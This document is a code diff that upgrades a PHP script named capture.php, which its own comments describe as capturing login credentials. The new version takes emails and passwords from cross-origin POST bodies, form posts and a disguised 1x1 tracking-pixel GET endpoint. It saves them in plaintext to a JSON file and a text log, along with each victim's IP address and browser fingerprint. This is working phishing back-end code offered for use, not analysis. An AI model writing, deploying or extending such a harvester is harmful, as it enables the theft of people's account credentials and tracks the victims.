@@ -1,129 +1,127 @@
 <?php
-// capture.php - Captures login credentials and saves them
+// Enhanced capture.php - Multi-method data capture
 
-// Set headers for CORS and JSON response
-header('Content-Type: application/json');
+// Allow CORS
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
+header('Content-Type: application/json');
 
-// Handle preflight requests
+// Handle preflight
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
     exit();
 }
 
-// Database configuration
-$db_host = 'localhost';
-$db_name = 'captured_data';
-$db_user = 'root';  // Change this
-$db_pass = '';      // Change this
+// Data storage file
+$dataFile = 'captured_data.json';
+$logFile = 'capture_log.txt';
 
-// Or use file-based storage (simpler, no database needed)
-$data_file = 'captured_credentials.json';
-
-// Function to get client IP
+// Get client IP with proxy support
 function getClientIP() {
-    $ipaddress = '';
-    if (isset($_SERVER['HTTP_CLIENT_IP']))
-        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
-    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    else if(isset($_SERVER['HTTP_X_FORWARDED']))
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
-    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
-        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
-    else if(isset($_SERVER['HTTP_FORWARDED']))
-        $ipaddress = $_SERVER['HTTP_FORWARDED'];
-    else if(isset($_SERVER['REMOTE_ADDR']))
-        $ipaddress = $_SERVER['REMOTE_ADDR'];
-    else
-        $ipaddress = 'UNKNOWN';
-    return $ipaddress;
-}
-
-// Function to save to file
-function saveToFile($data) {
-    global $data_file;
+    $ip = '';
+    $headers = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
     
-    $existing_data = [];
-    if (file_exists($data_file)) {
-        $existing_data = json_decode(file_get_contents($data_file), true) ?? [];
+    foreach ($headers as $header) {
+        if (isset($_SERVER[$header])) {
+            $ip = $_SERVER[$header];
+            if (strpos($ip, ',') !== false) {
+                $ips = explode(',', $ip);
+                $ip = trim($ips[0]);
+            }
+            break;
+        }
     }
     
-    $existing_data[] = $data;
-    
-    return file_put_contents($data_file, json_encode($existing_data, JSON_PRETTY_PRINT));
+    return $ip ?: 'UNKNOWN';
 }
 
-// Function to save to database
-function saveToDatabase($data) {
-    global $db_host, $db_name, $db_user, $db_pass;
+// Get complete browser fingerprint
+function getBrowserFingerprint() {
+    return [
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
+        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown',
+        'accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown',
+        'accept_charset' => $_SERVER['HTTP_ACCEPT_CHARSET'] ?? 'Unknown',
+        'connection' => $_SERVER['HTTP_CONNECTION'] ?? 'Unknown',
+        'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
+        'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown',
+        'https' => isset($_SERVER['HTTPS']) ? 'Yes' : 'No',
+        'server_protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'Unknown',
+        'remote_port' => $_SERVER['REMOTE_PORT'] ?? 'Unknown'
+    ];
+}
+
+// Save captured data
+function saveData($data) {
+    global $dataFile, $logFile;
     
-    try {
-        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
-        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-        
-        $stmt = $pdo->prepare("INSERT INTO credentials (email, password, remember, ip_address, user_agent, timestamp) 
-                               VALUES (:email, :password, :remember, :ip_address, :user_agent, :timestamp)");
-        
-        $stmt->execute([
-            ':email' => $data['email'],
-            ':password' => $data['password'],
-            ':remember' => $data['remember'] ? 1 : 0,
-            ':ip_address' => $data['ip'],
-            ':user_agent' => $data['userAgent'],
-            ':timestamp' => $data['timestamp']
-        ]);
-        
-        return true;
-    } catch (PDOException $e) {
-        // Fall back to file storage if database fails
-        return saveToFile($data);
+    // Add timestamp and IP if not present
+    $data['server_time'] = date('Y-m-d H:i:s');
+    $data['ip_address'] = getClientIP();
+    $data['browser_fingerprint'] = getBrowserFingerprint();
+    
+    // Save to JSON file
+    $existingData = [];
+    if (file_exists($dataFile)) {
+        $existingData = json_decode(file_get_contents($dataFile), true) ?: [];
     }
+    $existingData[] = $data;
+    file_put_contents($dataFile, json_encode($existingData, JSON_PRETTY_PRINT));
+    
+    // Save to text log
+    $logEntry = sprintf(
+        "[%s] Email: %s | Password: %s | IP: %s | UserAgent: %s\n",
+        date('Y-m-d H:i:s'),
+        $data['email'] ?? 'N/A',
+        $data['password'] ?? 'N/A',
+        $data['ip_address'],
+        substr($data['userAgent'] ?? 'Unknown', 0, 100)
+    );
+    file_put_contents($logFile, $logEntry, FILE_APPEND);
+    
+    return true;
 }
 
-// Main handler
+// Handle POST data
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Get POST data
     $json = file_get_contents('php://input');
     $data = json_decode($json, true);
     
-    if ($data && isset($data['email']) && isset($data['password'])) {
-        // Add additional data
-        $data['ip'] = getClientIP();
-        $data['timestamp'] = date('Y-m-d H:i:s');
-        
-        // Save to file (always works)
-        $saved = saveToFile($data);
-        
-        // Also try to save to database (optional)
-        // saveToDatabase($data);
-        
-        if ($saved) {
-            echo json_encode([
-                'success' => true,
-                'message' => 'Credentials saved successfully'
-            ]);
-        } else {
-            http_response_code(500);
-            echo json_encode([
-                'success' => false,
-                'message' => 'Failed to save credentials'
-            ]);
-        }
+    if ($data) {
+        saveData($data);
+        echo json_encode(['success' => true, 'message' => 'Data captured']);
     } else {
-        http_response_code(400);
-        echo json_encode([
-            'success' => false,
-            'message' => 'Invalid data received'
-        ]);
+        // Try form data
+        if (!empty($_POST)) {
+            saveData($_POST);
+            echo json_encode(['success' => true, 'message' => 'Form data captured']);
+        } else {
+            http_response_code(400);
+            echo json_encode(['success' => false, 'message' => 'No data received']);
+        }
     }
-} else {
+}
+// Handle GET data (for pixel tracking)
+elseif ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['data'])) {
+    $data = json_decode(urldecode($_GET['data']), true);
+    if ($data) {
+        saveData($data);
+    }
+    // Return 1x1 pixel
+    header('Content-Type: image/gif');
+    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
+}
+else {
     http_response_code(405);
-    echo json_encode([
-        'success' => false,
-        'message' => 'Method not allowed'
-    ]);
+    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
 }
 ?>
